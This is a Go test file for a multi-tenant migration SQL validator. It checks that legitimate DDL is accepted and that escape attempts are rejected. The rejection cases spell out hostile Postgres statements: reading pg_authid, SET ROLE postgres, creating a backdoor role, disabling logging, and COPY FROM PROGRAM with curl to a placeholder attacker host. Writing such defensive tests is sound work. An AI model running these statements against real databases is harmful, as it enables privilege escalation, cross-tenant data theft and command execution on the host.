package query

import (
	"strings"
	"testing"
)

// Issue #190: the migration channel accepts real-world tenant DDL —
// including everything #191 says the imperative DDL API can't express —
// while rejecting the escape hatches out of the tenant schema.

func TestValidateTenantMigrationSQL_AcceptsRealisticMigrations(t *testing.T) {
	cases := map[string]string{
		"create table with composite unique and check": `
			CREATE TABLE listings (
				id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
				source text NOT NULL,
				source_id text NOT NULL,
				status text NOT NULL CHECK (status IN ('active', 'expired')),
				price numeric(8,2),
				UNIQUE (source, source_id)
			);`,
		"partial and composite indexes": `
			CREATE INDEX idx_listings_active ON listings (district_id, created_at) WHERE status = 'active';
			CREATE UNIQUE INDEX idx_rollup_day ON rollups (district_id, date);`,
		"rls policy with public helpers": `
			ALTER TABLE listings ENABLE ROW LEVEL SECURITY;
			CREATE POLICY listings_access ON listings
			  USING (public.is_service_role() OR user_id = public.current_end_user_id())
			  WITH CHECK (public.is_service_role() OR user_id = public.current_end_user_id());`,
		"multi-statement with backfill": `
			ALTER TABLE listings ADD COLUMN normalized_price numeric(10,2);
			UPDATE listings SET normalized_price = price WHERE normalized_price IS NULL;`,
		"plpgsql trigger function": `
			CREATE FUNCTION touch_updated_at() RETURNS trigger LANGUAGE plpgsql AS $$
			BEGIN
			  NEW.updated_at = now();
			  RETURN NEW;
			END;
			$$;
			CREATE TRIGGER trg_touch BEFORE UPDATE ON listings
			  FOR EACH ROW EXECUTE FUNCTION touch_updated_at();`,
		"string literal containing forbidden-looking text": `
			INSERT INTO notes (body) VALUES ('see public.users and COMMIT; for details');`,
	}
	for name, sql := range cases {
		if err := ValidateTenantMigrationSQL(sql); err != nil {
			t.Errorf("%s: expected accept, got: %v", name, err)
		}
	}
}

func TestValidateTenantMigrationSQL_RejectsEscapeHatches(t *testing.T) {
	cases := map[string]string{
		"other tenant schema":          `SELECT * FROM tenant_b24e9fa8_463f.users;`,
		"own schema qualified":         `CREATE TABLE tenant_abc.t (id int);`,
		"public platform table":        `UPDATE public.projects SET plan = 'pro';`,
		"pg_catalog":                   `SELECT * FROM pg_catalog.pg_authid;`,
		"information_schema":           `SELECT * FROM information_schema.tables;`,
		"security definer":             `CREATE FUNCTION f() RETURNS void LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$;`,
		"set role":                     `SET ROLE postgres; DROP TABLE t;`,
		"set local role":               `SET LOCAL ROLE eurobase_migrator;`,
		"reset role":                   `RESET ROLE;`,
		"set search_path":              `SET search_path TO public; DROP TABLE projects;`,
		"commit":                       `CREATE TABLE t (id int); COMMIT; DROP TABLE t;`,
		"bare begin statement":         `BEGIN; DROP TABLE t;`,
		"create role":                  `CREATE ROLE backdoor LOGIN PASSWORD 'x';`,
		"create extension":             `CREATE EXTENSION IF NOT EXISTS dblink;`,
		"drop schema":                  `DROP SCHEMA tenant_other CASCADE;`,
		"create schema":                `CREATE SCHEMA evil;`,
		"grant":                        `GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC;`,
		"alter system":                 `ALTER SYSTEM SET log_statement = 'none';`,
		"copy":                         `COPY t FROM PROGRAM 'curl evil.example';`,
		"uuid_generate_v4 qualified":   `CREATE TABLE t (id uuid DEFAULT public.uuid_generate_v4());`,
		"uuid_generate_v4 unqualified": `CREATE TABLE t (id uuid DEFAULT uuid_generate_v4());`,
		"empty":                        `   `,
		"oversized":                    "SELECT 1; -- " + strings.Repeat("x", maxMigrationSQLBytes),
	}
	for name, sql := range cases {
		if err := ValidateTenantMigrationSQL(sql); err == nil {
			t.Errorf("%s: expected rejection, got accept", name)
		}
	}
}

func TestValidateTenantMigrationSQL_HelperAllowlistIsExact(t *testing.T) {
	// The allowlist must not open the door to other public.* objects via
	// prefix tricks.
	for _, sql := range []string{
		`SELECT public.is_service_role_evil();`,
		`SELECT public.current_end_user_id_2();`,
		`SELECT public.vault_get_for_runner('x'::uuid, 'k');`,
	} {
		if err := ValidateTenantMigrationSQL(sql); err == nil {
			t.Errorf("expected rejection for %q", sql)
		}
	}
}

func TestMigrationChecksum_TrimsAndIsStable(t *testing.T) {
	a := MigrationChecksum("CREATE TABLE t (id int);")
	b := MigrationChecksum("  CREATE TABLE t (id int);\n\n")
	if a != b {
		t.Error("checksum should be whitespace-trim stable")
	}
	c := MigrationChecksum("CREATE TABLE t (id bigint);")
	if a == c {
		t.Error("different sql must produce different checksums")
	}
}

func TestStripSQLLiterals_BlanksQuotedRegions(t *testing.T) {
	in := `SELECT 'public.users', "tenant_x.col", $$COMMIT;$$, $tag$SET ROLE r;$tag$ -- public.projects
	/* pg_catalog.pg_authid */ FROM t;`
	out := stripSQLLiterals(in)
	for _, leaked := range []string{"public.users", "tenant_x", "COMMIT", "SET ROLE", "public.projects", "pg_catalog"} {
		if strings.Contains(out, leaked) {
			t.Errorf("stripped text still contains %q:\n%s", leaked, out)
		}
	}
	if !strings.Contains(out, "FROM t") {
		t.Errorf("non-quoted structure lost:\n%s", out)
	}
}
